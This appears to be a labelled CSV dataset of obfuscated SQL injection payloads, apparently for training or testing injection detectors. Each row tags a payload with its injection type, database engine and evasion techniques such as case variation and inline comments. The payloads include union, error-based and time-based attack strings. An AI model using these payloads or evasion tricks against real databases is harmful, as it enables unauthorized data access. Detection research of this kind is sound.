payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
0o1/**/ ) /*fJz[?75Ra*/As JdHZ.wHerE (sElect 0x7E5)?[LIke 0b11111100101,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"4X0x0x0x6X8x1' ;), _) )* } && -0b0B1501b0O0o5o4XC9x0o2b0b110b110108 :lIkE~ )=? /((} 'aBcDEFG',uPpeR ;( =HEx ( rAnDomBloB~,( 0B1X9B0x0x0X2DCD235A/(sElect 0x0O0x0o0X8b10X2)]\ )/*?/6InJzsZ)LN)C0e0x0B0o0O0xbB106 ;fo0B1KoL!aGjm2WVe~BrRA|0x0X9 0b10V0o17zG>[ a(pk. ->EByzzJ0;Sho*/ ) )* ) &&<.(|>^:( [ -( %'ZovB'``LikE} 'zOvb",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O1'; \) anD (sElEcT (seLECT (SELecT (SelecT (sElecT 1))))) aNd tRue oR FAlsE OR False# ) ) (( sELECt ( CasE wHEn .( 0X154b LIKe (seLeCT 8x0x1551) ) THeN ReGExP_suBstRIng (~ rEpeAt ( RiGht> () ChAR /*B^(seLeCT (seLeCT (sELeCt (sElEct 3O6)))),$lLMpjtyO+ yi? KbR>O S""hAfI*/( 4X154b @)* ,0X0 ) ,0o0O1B0x13dEA0B0f724848c85962aF6E9 ) ,nuLL: ) eLSe chAr ( (sELecT 7x3c) ) Or]ChAR ( (seLEct 0X0x4A) ) Or cHaR ( 0X0O6O0x6A ) Or chAr) ( (selECt 0o0X9b0Xf55D2) )' eND /) fROm INF OR MaTION_sChema.sYstem_USERs ) And`< ( &!(^ (; 'Owga' LIKe 'owGaCr2Y?",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1!or!ExTracTvALuE ( 3o2o2321,cOncAT; ( }0o0B1X5c,0X7273706a71,] ( selEcT "" ( ElT (!%0X0B0x0x4O3F9 =/*0X3|Cn0y(/OlpsuD*/0o0b140101110110,0x0b1 ) ) /*0x7:^*UP}h]N;69p 0x4btlarB*/ ) <,0X0o6X717a0x0x2e1a71 ) )/**/ AnD tRuE ?Or fAlseaNDtRUE!and (SelecT (SeLeCt (seLEcT (SeLeCT 1x1))))||falSe oR (SelECT (SeleCt (SeleCt (sElect (seleCT (SELECT 0)))))) or 'g' nOt LIKE 'g' oR (SeLecT (SELECT 0)) or FAlse AND '3s;:'='3s;:' AND 1# OgwE)`rJE_Hw;m^?""",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.4,rule,sqliv5_json,string_single_quote
"8O3'+ >( SelecT]'MIKF'+WHeRe (Select 1xb1c)*>=[ (SeLeCt (selEcT (sElecT 0b0X0o0X15ee))) oR 9o8O53320\'= ^(%~seLEct coUNT ( /**/* ;) frOm_sysusERs/*|O oR FaLSE]oR ""K"" liKE ""kP"" Or (SeLecT (SelECt 0x0)) AnD (sELECt 0xE74) not LiKe<0B0Xe74 ANd TRue /**/OR 0x0O22d3B0X3E9 liKe 1x13dA Or FALsE or false= aND~ (seleCt (seLECt (seLeCT (sELECt (SeleCt>1))))) oR ""Aq>K"" NoT lIkE ""aq>K""^aND tRUe oR (seLeCT (SeleCT (SELECT (SELECT 0)))) Or (SeleCt 0X0) aND!(sEleCt 1) AnD TRUE AnD 1#.qoHU*HyrMeyI <\?{DmKI+~jP.c+?)Mby{M[Mr*/As Sys1,sYsUsers AS Sys5,sYSuSers aS sYs1O3,SysUSERS as^SyS4,SysUseRs/As syS4,SysUSERS as syS0b429,SysUsERs As|SYs5b0o0o31o166; ) } ? oR ! faLSE oR (SeLECt 0x0b0) --k`Kci9""/.>Y",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O1"":WHerE 0219 "" LiKe (SElECt 5039) and && (seLECT 0O1) or fAlsE - And TrUe AND (sElECT 0xCC4) LIke 3298(OR FAlsE or 0X0 && ""uzr"" likE ""UZR"" or False/**/ANd (sELeCT 8405) Not LiKe 8456 && tRue OR fALsE OR 0 oR ""KIkp""!=""kiKP"" OR False AND True#ChaR ( =(select 7B2101111) ) '||CHAr ( (SELEcT 0X7x4d) ) }OR cHaR ( ^0XAB ) or chaR ( 0X0B1x58 ) {=? rEGexp_SUBsTriNg^]( REpeAT ( lefT ( CRyPT_kEy ( chAR ( (sELecT}0O101) !) or ChaR ( 0X0x4B0O12d ) ||cHAR (; (SELECt (SELEct (SeLeCt 88))) ) ,null ) ,(seLeCt (selECT 0)) )( ,(SEleCt 0X1E19Cb98)/**/%) ,NulL ) Or (SELECt (SeLect (SElect-(SelECt{(sELECt (SELECT (SELECT 2))))))) anD tRUE or (SeLeCT 0) anD (sELect (SELECT 1)) oR fAlsE+--E.> (IBx`:",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"SeLeCT:COUnT (= * ) frOM gENERatE_SERieS ( (seLECt (SELECT (SELECT 1))),(SeleCT 0x4C6e68) ) aNd[ ( ( (/**/ ""uydM"" LiKE ""UYdm",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1' iN BoOLEAn`MOde/**/ )`/**/\Or eLt ( 5O9x4Xf12=0x1X3E0,SleeP\;(/ 5x4 ) {) oR 'g`' LikE 'g`R'~ AND; TRUE OR FAlSe Or (SEleCt (seLect (SeLeCt (selecT 0))))#-!(_;LpnegXKa-<",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.8,rule,sqliv5_json,unknown
"5O0o0O1%""= )""? AND MAke_SeT ( (seLECT 0x26E4) lIKe (SeleCT>(SeleCt (SELECT (SELECT (SELECT 2080))))),(SeLect || 0 OR False#0o0x424)/**/ ) "" AnD ( ""%""[ =< ""K20-?pL",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,numeric
"3X8% ;)` /*aiB/ TY(4e4jLF[*/ ) _(union-aLL SEleCt NulL,NulL OR FAlSe Or ""9qM"" <> ""9qm""(and (seleCT;0B4)#|",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"7%'{;^) ~*).) ~=)[$)]^[ AND`][ {0o0o2o0B5B5b0x0b0b10E0b0O5Xa5C===(""*SelEcT`cOUNT:`(?<RQdpe\Rip */"")>}!froM/*0b1b?{`a!*/sySUSERs&AS<sYS0o1,SYsUsErS{aS<sYs2,sysUsErs@As?syS0x6x0B0o0x0b1107fo0b1010B0b0x9B10011101111180,SYsUsERs.aS/* K~(select_(SelEcT{(SELeCT/**/0x7)))vF~bM+*/sys7x0O0o0o4b4b0O0o0o103747015,sysUsERs=As=Sys7O4,sySUsERS[AS&sys0B106x0B0o156,SYsuSeRs/*X|T=""~L]*/as/*dhg+( E*/SYS3/;)?+(~ $aNd~-:,[TRuE} Or>[fALse --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0%' :) ,-or +( SElECt (SeLecT (seLeCT 0x262d)) FroM ( SeleCt cOunt ( * ) ,concat ( 0b0x0x4D6e7Aa78, ( sELeCt\ ( ~eLt ( (selEcT and True Or fALse || (SELECT 0) or (sELeCT 0)#(SElEct (SElECt (sELEcT 7193))))[= (SELECt 0XC65),(sElECT (sELECT (SElect (SELECt 1)))) )"" ) ) ,0b0O0x0B6x717A767a0b11111,FLOOr ( $RAnD} ( 0 ) *(SELeCT 0X3) | ) _ ), x FrOm infOrMATioN_sChema.cHArActer_sETS GrouP By x ) =A ) ANd ( '%' liKe 'K%^6",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
( SElect ( CaSE WhEN ( (SELECt (SELECT 0x15e3)) lIke (selecT (seLecT 0x0b1111e3)) )) tHeN 0X15e3 ElSe CAST ( 0x1 AS INT ) / ( SELecT 0X0o0 from duaL ) enD ) frOM DUaL ),error_based,oracle,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
SElect ( cASE WHEN ( 0b0x152f LiKE 0X1E1a ) tHen (sElect 0x152f) Else cAst ( (SeLecT (SeLecT (sElECT 1))) aS!InT )) / ( selEct 0o6 From DuAl ) eNd )% fROM duaL--,unknown,oracle,case_variation|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"4"" ) AnD ExP ( ~ ( seLECT * frOm ( ( seleCT COncAt (- 0X6X6D0O1e0aA71, ( @seLEcT ( eLt ( (sElEcT (sELEcT (SELECt (SelEct (selecT 0x231e))))) likE 0X1fFe,(seleCT 0X1) ) ~ ) ) ,0b0B111X0X7cDA0x0x2fFa0X4B,0O0x78 ) ) x ) ; ;) anD ) ( {""Wfwg"" LiKE ""wFwG",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O6O0o0B0o4x0o0o0o0B0b9o3e0o10o0B1010""&.^)/, )] <]~) ? _ : Or + ; +!6o0O1O1X9Xd0X0b0B10011101111110 ;=}; ( `seLEct~count?\(.;* ))[<FRoM<SYsuSERs aS syS7b0B0B10,sYsUserS&AS""sYS3x0,sYSusErS'aS sys3,SysUsERs$As\Sys0O0O0O0o5,SYSUserS%aS""SyS0O0B1b9o0O13B0,sysuSerS\AS/*z/:d&i~TM/S@S5~} UV{*/SYS8,SysUsERs/as SYs0O2fuVnE*/) ;-AnD~/ ( [( @ !(</*(ifros[u*/""aBCw"".%?LIke ""AbCw",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"1'+&{( SeleCt brUK where 0x578=0x532;proCEDUre ANaLySE ( _ExTrACtVALUE !( 0X8O6x16d0,coNcaT ( /0X0x5c,0B2x0X6D6E98a0X0O0O71, ( selEcT. `( [CasE WheN_ <( ANd 4x12d2 lIkE, (SELEct 0x0x1O0x18D0) \) = thEN/*Z+9EiG{EH uQ;k=~+h;SWX/ ptreg6{x ol*/3x3.ElSe@5X0-End ?)? ) ,8x2X0o8O0x0o0o2603A867A21 ),)/*1AHT+Ayp35gOr8>eXgOK xOqwboRVM[*/@)\, ,0x1O0x1/*(SelEcT$(seLeCt (sElECt (SeleCt (SELeCt (SeLeCt{5x0o2))))))&?wfbBt1]*/ +)* ) : +'",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) ]WHERE 2X0O1E03;_lIKE 0X9e60_anD<CHar ( 0X0x6F \) +Or ChAr (`?0x3D ) oR cHar (& (SELECT 2x79) [) OR cHAr ( (SelecT (sELECT 0O0x62)) ) ) like RegExP_sUbStrING/*E)icu V],s?*:/d' q*/ ( RePeat$ ( left ( CRypt_KeY -( ?chAR- ( (SeleCT (SeLEcT (sELECT (seLEcT (SelECt (seLECt (SeLEcT (seLect (SELECT 48))))))))) )| OR cHaR (; 0x55 "") :OR CHaR ( (SELeCT 0x54) ) ,null .)];,0X0o0B9 ) ,0x0X5x43E0x1e64& ) ,NUll )& And TrUe OR~(sELEcT (seLeCt 0X0)) Or faLSE OR (SelecT 6X5C8) like 0x2AA OR FALSe% aNd 0x2 or falSe aND}trUE Or/ (SeLEct 0B0x0) OR ""v"" like ""vA""`ANd!TruE aND tRuE OR fALSE OR ""mc "" nOT=""mc "" oR faLse Or faLsE AND 1 --",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) as,AmGF WhEre 0o0x0o6XAcE ]LIkE (seLecT 0b0X1070) aND`ChaR ( (SeLECT (selECT (sELECT (SELECt (SELECt (selECt (SElect (SELECT (SELECT (SELECT 128)))))))))) ) Or&ChAR ( (sELECt 0x6A)( ) OR cHAr\,(@ 0x0X0x0b9b11110108100111110011 ) OR CHaR ( :(select 1B1001)@:) anD tRUE anD tRue AND True AND True#=(/**/ReGexp_SubstrINg (* RepeAT ( RigHt [( chaR ( (SelEct 0O0x26FF) ) /*]f (a B vr*/,0X0B0 ) ,(SELECt 0X12A048e40) and "";""="";"" Or 0o0x2:ANd 0x0 && ""xGl""<>""XgL2"" aNd truE Or FalSe or (SelECT (seLEcT (SELECT 0x0))) and TrUE#) ,nUll ) or (selECT 0o0x0B0) ANd><true or;faLsE or (sELeCT 0X0) && trUe lIKE aND] trUe ANd ""d:"" NOT lIKe ""d:\"" --XObl9N;6x^s",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1[/*zN ir*/ ) ;^) ;as'rcBZ,WhERe 0X11e0o7 =""(SELecT (seleCt 4563)) +anD 0O0X0o7d8~= 6o3721",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O0x0x5'+=/( ~seLEct MrDi WhErE 2X1d2b% lIKe( 0b0Xeb5e56a443^aND 5B10000110018010 LiKE [( SElEcT (seLECt_(seLEct (seLEct 1554)))|FROm PG_sLeEp ( (SElecT 0X5) ) } ) & oR FaLsE anD ""Z/"" noT liKE ""z/}"" OR fAlSe&&(SEleCt (selEcT (SElect (SelecT 0X1442)))) not lIkE (seLect (seleCT?0X1853)) OR ""H!"",like ""h!Q"" oR FALSe oR faLSE Or (seleCt 7366) lIKe (SElEcT*(selEcT (SELECT 7764))) oR FalsE or False And truE AND/**/True --",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.06,rule,sqliv5_json,string_double_quote
"1. )^ wHERE (seLEcT (sELeCT (SElECT (SElect (SELECT (SELECT~(SELECT 2403))))))) likE 0o0X0b1301a5x9 && UPdatEXML! ( (seLEcT (SEleCt 0Xd41)),CoNCAT ([ 1X2E,5x0X0b110D6e7aA51, ( <selECT (. eLT ( (sELect 0XD41) lIKe (SElect (SeLECT (seleCt 0XCf1))),4B0x1 ) ] ) ? ) ,0x317a767a71: ): ,0X889 ) OR 0X0 aND truE and TrUe AND 1 --",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0x8'- ) ) OR char` ( (SElECt (sElecT (SelEct (seleCt (seLEct (SeLeCT (SElecT (sElecT (SELECT (SELECT (SELECT 814))))))))))) ) Or cHAr .( 0b0X0B112f )$ oR chAR ( 0B111X49/*;dr**/ ) OR char ( [(SeLeCt 0xc6) )` :liKe rEGexP_SuBsTrIng {( RepeAT ( LEft ( >crypT_KEY (/ CHar ( (seLECT 0o0O0x49) ) ||CHAr_ ( (seLEct 1O0x0b109101) )/ }Or CHAr ( 0x53 ) ,nuLl >) ,(SELECT (SElECt (seLeCt (SelecT 0b0O1X0)))) }) ,0X1e12b0b0b0o0B110010 ) ,nULL ]) ] aND + ( ( ? 'AOVy'/*Yu*/ LikE 'AoVY",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1= OR (SElECT (sElECt 6X0o24C0)).lIke LiKE ( 'AbCdeFG',upPer ( HEx ( raNdOMBLob `( (sElECt 0x3Dcd68E8)/0X2 ) .() )/ FmW0AZHT;*/v~JGQY2]F*/ )' Or 0x870 Not lIKE (SELEcT (sElect 2450)) OR (SeleCt 0X0) oR 0xDfc=(seLeCt 0XdFd) And:True or (SELECT 4455) NOT LIKE-(SeLECt 6X1937) AnD TRUE%oR fALsE OR (seLecT (SElECt (SELEct 0X3A3)))|lIKe 0X0x0X3d6 Or faLse {Or FaLse && tRue AnD 171 not lIKe 172 AND 1#?hkRPHSpT",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,numeric
"1%' ) *() Or (( sELEct (seLeCT[(SELeCt 0x2))* ( if :( ; `( sEleCT * fROm ( SELECt coNCaT ( 3x7171706A71, ( SELEcT }( ELt ( {(SELecT~0b1111110110001) lIKe 0x0O0B1Fb1,0x1 ) ) ) ,0x717A767A11,0x0o116 ')"", ) S ) , 0x7538Dd0o11e7234d67a, (SeLECt`0b111010100101010101601110001000011101010111111111111111111111010) )* ) '): && ( ( '%'='",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' +) aS,tyGi WHerE 0b0X26A3/*A3kLA@s:Y 'A*/ LiKE 0X25dB && +row ( (sELEct (sELeCt 6277)),0x1D2D ) ,> ( SeLecT""CoUNt; ( * ) ,conCaT (~ 0x0x6d0o6e7AA71, ( sELEcT (* ELT ( (sElect (SElECt 0x185D)) liKe (SelEct (seLECT 0B1105001011601)),(sElECt 9X1) ) () ) ,0X717A762a0O107,FLO|| ( Rand ( 0X5 ) *0O2 ) +) x+From ( sElecT 0x0488/*p""YI)h3pFijRVp]9Jf+BD*/UniON select (sEleCt 0x2551) UnIon SelECt (SELeCt 6XF5B) UNIon selECT (Select (sEleCt (SeLEcT 0o16752))) ) a GrOup by_x ) OR ""{("" LIKe "" (/"" && True anD 'De' NOT LIKE 'dE_' aNd (SelECt (sEleCT 1)) and (SeleCt 1) oR False aNd true ANd '<r>i'/NOt LIkE '<R>ie' && (sELECT 1095) <> (SeLeCt 1096) or 0b0o0XdEA NOT lIke (SEleCT (SelECt (SeLeCt (SELECT 3562)))) Or 0 Or FAlSe or (SELect 0) Or ""E/""=""E/Q"" --",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"1 ~ aND 0o0x0o1E4c=dbMS_uTIlItY.sQlId_To_sqlhASh +(@ $ ( Chr ( (seLEct 7X71) ) OR cHr ( (SeLECT (selEcT;0xAD)) ) oR cHR ( (SElEcT^0O0Xa0) ) OR CHr ( 0B0b0x3O6a\ ) oR chR ( Or ""`"" Not LIke ""`"" && 0O1 AND trUe AND ""'qh""!=""'Qhl"" OR FAlsE Or FAlSE OR False^OR False OR False OR False# 0X0x1 +)||(, SelEct$ ( cASE&whEN ( 6b4X0b1104384ACd8B1ec8c LikE$(SElEcT (sELect&7XAC4)) ) THEn (SElecT 0x1) elsE (Select (sElECT (SELECt 0x0))) enD ) From*Dual ) ||cHr/*XSOyJh@(SELECT (SELect (sElEct|(SeLecT (selEcT (SELECT (SELECT 9)))))))m6&P NYo*/ ( (SeleCt (SELEct (SElecT (SELECT 113)))) ) ||CHr ( (Select 0x0X0X0A)) ) OR ChR ( (SeLEct^(sEleCT 0X0X4C)) ) ||CHR ( 6X7A ) OR chr/ ( 0X61 ) ) = ) r[i9<!G 6FL&Q",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.11,rule,sqliv5_json,string_double_quote
"7o0o4B0"" `) ) ) AS DfWI wHErE (Select'2B0x45E0o5) =| 9X24e7:Or 1x0O0X3E9d := < ( sELEcT cOUNt -( ""* ) ` fROM DOMain.domaINs aS T3,DoMaiN.COlUMns AS T8,DOmain.tABles aS{T0b1001x3! ) / AnD ""+"" NOt<= ""+F""'aNd TRUE Or ""r"" likE ""r^"" oR 'A{:'='a{:+' Or FALSe Or FAlSE OR='OM' nOT^LiKe 'Om'=OR faLSe && ""= s"" nOt'LikE ""= sa"" AND tRUe OR ""DgY""@= ""dGY`"" oR fAlsE OR ^""6E5"" nOT LiKe ""1E6"" aNd:TruE aND TRUe and "" P"" nOt~liKe "" P~"" Or fALsE OR (SelECT (SELECt (SElecT 0))) AnD TRue Or faLsE ANd True and truE OR fAlse --",boolean_blind,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"6B3' ) }WHEre (sElect (sELECT 4x5be)) liKE 9X0o0o0x7Be AND CHaR <( 3x6f ) Or{ChAr (;)(sELEcT (SElECt!0x0x0x6d)) .)( or chAR ( ?0X79[ ) OR-CHar. ( 0x6X51 ) ?= ReGeXP_suBStrinG ( (repeAt ( LEfT?_( crYPt_KeY ( chAr ( (SElEct (SELECt (seleCt 6X4B))) ?) * oR ChAr,/*<O c(f7>|mBiYT9FZy>*/(\ 1o0x40 !) &- oR chAR ( 0x53. ) ,NuLL ) ,0B0O6X0B0 ) OR (SeLEcT 0x8x0):Or faLSe or/*M,*/FalSe or]FALSe~oR FALsE anD TrUE ANd \1X2x40Ad=0x216D;or ""+EHn"" Not LIKe ""+EHn""< or false OR/FALsE OR fAlSe and tRUe oR FalSe OR (SEleCT 0x5) AnD TRUe Or 0X1dA4 LiKe (sEleCt (SelECt (select (seleCt 0X216f)))) Or falsE OR fALsE ANd (seLecT 0X1) OR FAlse AND tRue OR False#%,(select (Select!0X2630E81F)) ) ,NULL ) OR}""`"" Like ""`O"" ANd?""t""=""T""""AnD TRuE<oR falSe---~Nk *v;Vy`Xe{`gF `<^ >Lg?;",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" where 0O0B0o3412' =!_0b0O0o0B19100111120 UnIoN\ALL*SELeCt/*wmg2{(sELecT (seLECt)8o3b110)) AM AND (selecT&(selEct (seLeCT (selECt (SelEcT_(SEleCT (SELECt (SelECT 0X1)))))))) aND%""2F&wr""$noT liKE ""2f&WRa"" or }0x22E8 nOT[LikE 0o0x64e8 aNd TRUE ""&& TRuE oR (SELecT (SElECt (selECT 0))) Or (SeLeCT (SELECT (SELECT 166))) likE?(sELEct 0XA7) && trUe^aNd 0B1#!Ph hza\0x17m#=e19$*/NUll,nUll,nUll,NUll,NULl,NuLL,NulL,null,NULl#hED""ybou2#",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0O0o6 \){^ As/*qir */IQKF}wHERE?(SELEcT\6b0x1e64) [ lIke,, 0o0O234253",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1%' ) anD> (/**/ seLeCT (sElECt 0O71553) FrOm ( SELecT count/*0X7. jL\(SEleCt (SEleCt 6)):zc*/ ( * ) ,cONCaT ( 0o0x0x6d0e3AA71, ( SELecT=,[(^ eLt ( 5b49001101101055=0b10009101101111,(seleCT 1) ) )/*Pe*/ ): ,0x0B0x2CdA767A80,fLO OR ( RANd (& (sELECT (sELect (sELEct 3))) ) *(seleCT (SElEct (sEleCT (SElEcT (selECt (SeLect 7))))))< <) ] )]/ X FRoM InF or mAtIOn_schEMA.CHaRacTer_SETS groUp bY X /*^gl]Z*/) a )anD( '%' lIkE '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' ) ~/*,/Q(Itli}(seLecT (SELECT 2))(SeLECt (sElECT (SELECT 0))) .*/WHere<0B10B0X4C9{ LIKe 0X0X7x7c0B0X5 && elt (@`0X221F = (SELecT)(Select 0X0x1ec7)),0X1E63 ) -And 1_' && tRUe= and (seleCT(0X1dF4) [NOt liKE 0X42A OR,FalSe anD 0x1 OR fALSE:anD (seLect (seLect (sELeCt (sEleCt{(seLECT 0X1a4F))))) noT LikE 0X0o1A05 --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"SELECt{count !(:%* ) .""FrOm)aLL_UsERS t0o0O1,alL_users T0o1,alL_users$T0o2,alL_useRs!T0O0x0b9B109,all_usERs t0b0o0B0b0b110100010001001001101101110110010101000000001010001011000100000111111010000101000010000100;and/*}*//**/+_( /*(?qiWppK4/Ld^_~E*/,(""aND%'{F'<>' f\' AND tRUe/*g11*/ Or ~FalsE OR (SELECT 0)#< /**/ ( ~""ymSS"" `Like$ ""YMSS 0b101E6K",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"1'+?%( SeLEcT 'QpxK' wheRE (SelECT 0b0x8bE3) LikE 9x1be8x0b0 PRocEdUrE?anAlySe. ( extraCTVALue ]( (SELECT 0O0Xcb7),CoNCat ( 0x5C, ( BENChmARK ( `0B0x0b0X5X4c4b30,md0b901. ( }1O0X0b1X3E88B57b9847Ba57 ) /) "" $ ) ]) ?!) ?,(SELECT (seLECt!(selECt (SeLeCT (seLect (SElect 8O7b0x9)))))) )] )!/*%;?gEC}0x7(*/ +'",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"1, (* SELeCt ($ cASE whEN ~( 0x5e7 lIke 0X1f59+ )/*YR*/ THEn 1 ElSE (sElEct (SELECT (SELECT (SELECT}(SELECT 2257)))))* ( SeLEct 3x4e7.fROM mysQl.dB ) EnD ) )",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1, ( caST ( ( CHr `( 0o325 ) : OR CHr ( 9x0x0b0b0O0X6b ) [Or Chr ( 0x0x90 ) or cHr ( 0b0b0o0O182 )- Or: chR ( (SeleCt (sELECT (seLECT (SelEct (sELect (SEleCT (SELECt (SElECt (SELECT 113))))))))) ;) + ) or ( /**/SeLect - ( caSE WHen ( (seleCt 0X1E8f) = 0b1111010310010 ) thEn (sElect (seLECT (SELECT 1))) eLSE (sElecT (SeLECT (sElEct 0))).enD ? ) ) ::TeXT or/**/[ ( ChR< ANd 0X1 aND (SElect 0b1) And[(SeLEct (sELecT 0x1)) or (seLECT (SElEct (seLEct 0X0))) || (SEleCt (selEct 0x1)) oR 0b0o0 && 'qcL' LiKe 'qCl' or fALsE OR 9 ANd TRuE aNd 1` or FAlsE or faLSe and TruE OR False#(. 0x0O0b0X6B ]) Or chR ( 2b95710180 ) % oR cHR ( (seleCT}7X78) ) Or chr ( 0X0b0B0b6101111A ) Or cHR ( (seLEct@(SELEct (selEcT 0B1110001))) ) > ) ^As numeric ]) ) ^&-fRt""t[AYEV`/",boolean_blind,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1', oR & ( SeLeCT 'UvBb'""WHeRe (SelEcT (selEct (SElect (sEleCT 0x1e0O111))))%like (SElECt 0O19606)<or cHar /*(au/aje2%sh;DhTh?=FB n;y9&zu[^|(sELECt (sELEcT (SelecT 0)))*/( 0b0x0X4b^ )/*(seLecT (sELecT (SelECt (SELECT (sELECt (SEleCt;(SeLECT 3x6))))))).c=*/ or chAR :( 7X0B3b110f ) + or CHAr})( (sELecT 0X79)+ ) -@Or chAR ( {(SelECT 0b0O144) ) _LIKE regEXp_suBStRiNg. ( rEPEat ( LEft %( CRYpT_kEY ( ChaR ( 0B0b0b1b0O0O1116262150725530750301 ) oR<cHar+ ( 9X55 ) or ""cHAR [( ~0B1010919< ) ,,null ) ,0x0B0b0o3 }); ,0X0B1dcD6500</)` ,nUlL ?) ) OR '",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
SeLeCt! ( {cASe whEn% (% 0x1347 lIke ;(SELeCT 0X0O34e4) )/**/ THEN (selEcT (sELect 6935)) elSE)0X0b1B17* \( SElEct (sELEcT (SELECt (sELECt (SeLeCT 4935)))) frOM MySQL.db ) eND ) AND '%' != '%Q'#ml,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
